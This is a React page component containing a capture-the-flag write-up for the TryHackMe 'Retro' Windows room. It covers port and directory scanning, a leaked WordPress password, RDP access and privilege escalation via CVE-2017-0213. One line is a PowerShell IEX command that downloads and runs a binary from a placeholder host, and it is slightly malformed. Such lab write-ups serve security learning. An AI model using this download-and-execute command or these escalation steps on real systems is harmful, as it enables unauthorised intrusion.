import React from 'react';
import ScrollspyContainer from '../ScrollspyContainer';
import ImageCap from './Helpers/ImageCap';

import landing from '../../img/retro/landing.png';
import nmap from '../../img/retro/nmap.png';
import osBuild from '../../img/retro/os-build.png';
import privEsc from '../../img/retro/privesc.png';
import rdp from '../../img/retro/rdp.png';
import rootFlag from '../../img/retro/root-flag.png';
import userFlag from '../../img/retro/user-flag.png';
import wadeHint from '../../img/retro/wade-hint.png';
import wadeHintTwo from '../../img/retro/wade-hint-2.png';
import wordpressLogin from '../../img/retro/wordpress-login.png';
import gobuster from '../../img/retro/gobuster.png';
import gobusterSecond from '../../img/retro/gobuster-second.png';
import homepage from '../../img/retro/homepage.png';



class Retro extends React.Component {
    render() {
        return (
            <div className="writeup">
                <div className="container-fluid" >
                    <div className="row bg-dark">
                        <nav className="col-3 px-1 position-fixed offset">
                            <a href="https://tryhackme.com/room/retro" target="_blank" className="nav-header">Retro</a>
                            <hr></hr>
                            <ScrollspyContainer ids={['render','intro','enumeration','portscan','dirdis','exploitation','privesc','userflag','rootflag']} />
                            <hr />
                        </nav>
                        <div className="content col offset-3">
                            <div className="render" id="render"></div>
                            <div>
                                <div className="carousel landing">
                                    <div className="carousel-inner">
                                        <div className="carousel-item active landing-container">
                                            <img className="writeup-landing" src={landing} alt="Background image"></img>
                                            
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <h1 id="intro">Introduction</h1>
                            <p>This is a Windows box that features multiple methods of retrieving both the user and root flags. This can be a relatively difficult box for those who aren't familiar with Windows kernel exploits.</p>
                            <p>Retro falls into the following categories:</p>
                            <ul>
                                <li>Windows</li>
                                <li>Wordpress</li>
                                <li>CVE</li>
                            </ul>
                            <hr />
                            <h1 id="enumeration">Enumeration</h1>
                            <h3 id="portscan" className="level-2">Port Scanning</h3>
                            <p>First, I scanned the box using nmap to find any open ports.</p>
                            <p className="code-snippet">&gt; nmap -sS -sC -sV -Pn 10.10.57.172 -oN nmap.scan</p>
                            <br />
                            <ImageCap image={nmap} text="results from nmap scan." />
                            <p>The nmap scan revealed an IIS web server running on port 80, as well as RDP running on port 3389.</p>
                            <p>After this I used Firefox to view the website.</p>
                            <ImageCap image={homepage} text="default IIS page hosted on port 80" />
                            <hr />
                            <h3 id="dirdis" className="level-2">Directory Discovery</h3>
                            <p>The homepage is a default IIS page, to find more hidden directories, I used a gobuster scan:</p>
                            <p className="code-snippet">&gt; gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u 10.10.57.172 -o root-gobuster.scan</p>
                            <ImageCap image={gobuster} text="results from first gobuster scan." />
                            <p>This revealed a hidden directory named <span className="code-snippet inline">/retro</span></p>
                            <p>A quick look told me it was a blog site running Wordpress, I ran another gobuster scan:</p>
                            <p className="code-snippet">&gt; gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.57.172/retro -o retro-gobuster.scan -x php,txt</p>
                            <br />
                            <ImageCap image={gobusterSecond} text="results from second gobuster scan." />
                            <p>Whilst this scan was running, I started looking through each of Wade's posts, and found an interesting one:</p>
                            <ImageCap image={wadeHint} text="post from Wade." />
                            <p>He even took the time to give us a password:</p>
                            <ImageCap image={wadeHintTwo} text="a comment from Wade." />
                            <hr />
                            <h1 id="exploitation">Exploitation</h1>
                            <p>Using these credentials, I was able to login to Wordpress.</p>
                            <p className="code-snippet">wade:parzival</p>
                            <br />
                            <ImageCap image={wordpressLogin} text="logging into Wordpress." />
                            <p>Before using Wordpress to get a reverse shell, I remembered that port 3389 was open. Using this I tried to get an RDP session:</p>
                            <p className="code-snippet">&gt; xfreerdp /dynamic-resolution /u:wade /p:parzival /cert:ignore /v:10.10.57.172 /workarea</p>
                            <p>Surprisingly, this was successful.</p>
                            <hr />
                            <h1 id="privesc">Privilege Escalation</h1>
                            <ImageCap image={rdp} text="using RDP to login to the target machine." />
                            <hr />
                            <h3 id="userflag" className="level-2">User Flag</h3>
                            <p>The User Flag was found on the Desktop:</p>
                            <ImageCap image={userFlag} text="user flag found." />
                            <hr />
                            <h3 id="rootflag" className="level-2">Root Flag</h3>
                            <p>To get the root flag, elevated privileges need to be acquired.</p>
                            <p>Here I got stuck for a very long time, following dead ends that involved the CVE listed in Wades Chrome favourites and trying to get a JuicyPotato exploit to work using a reverse shell from the website to get lower pivileges.</p>
                            <p>I finally researched the OS build and found <span className="code-snippet inline">CVE-2017-0213</span>.</p>
                            <p>The OS build was found by running <span className="code-snippet inline">systeminfo</span>:</p>
                            <ImageCap image={osBuild} text="os build found from systeminfo." />
                            <p>To perform this exploit, first download <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213" target="_blank">CVE-2017-0213_x64.zip</a> and unzip to get the binary.</p>
                            <p>Then start a python http server:</p>
                            <p className="code-snippet">&gt; python3 -m http.server 1000</p>
                            <p>Download the binary onto the target machine:</p>
                            <p className="code-snippet">&gt; PowerShell IEX(New-Object Net.WebClient).downloadString(http://YOUR-IP:YOUR-PORT/CVE-2017-0213_x64.exe')"</p>
                            <p>And now execute it whilst not in a terminal:</p>
                            <ImageCap image={privEsc} text="terminal spawned with elevated privileges." />
                            <p>With this terminal, the root flag can be found on the Administrator's Desktop:</p>
                            <ImageCap image={rootFlag} text="root flag found." />
                            
                            
                            
                            
                            
                            
                            
                            
                            












                        </div>
                    </div>
                </div>
            </div>
        )
    }
}

export default Retro;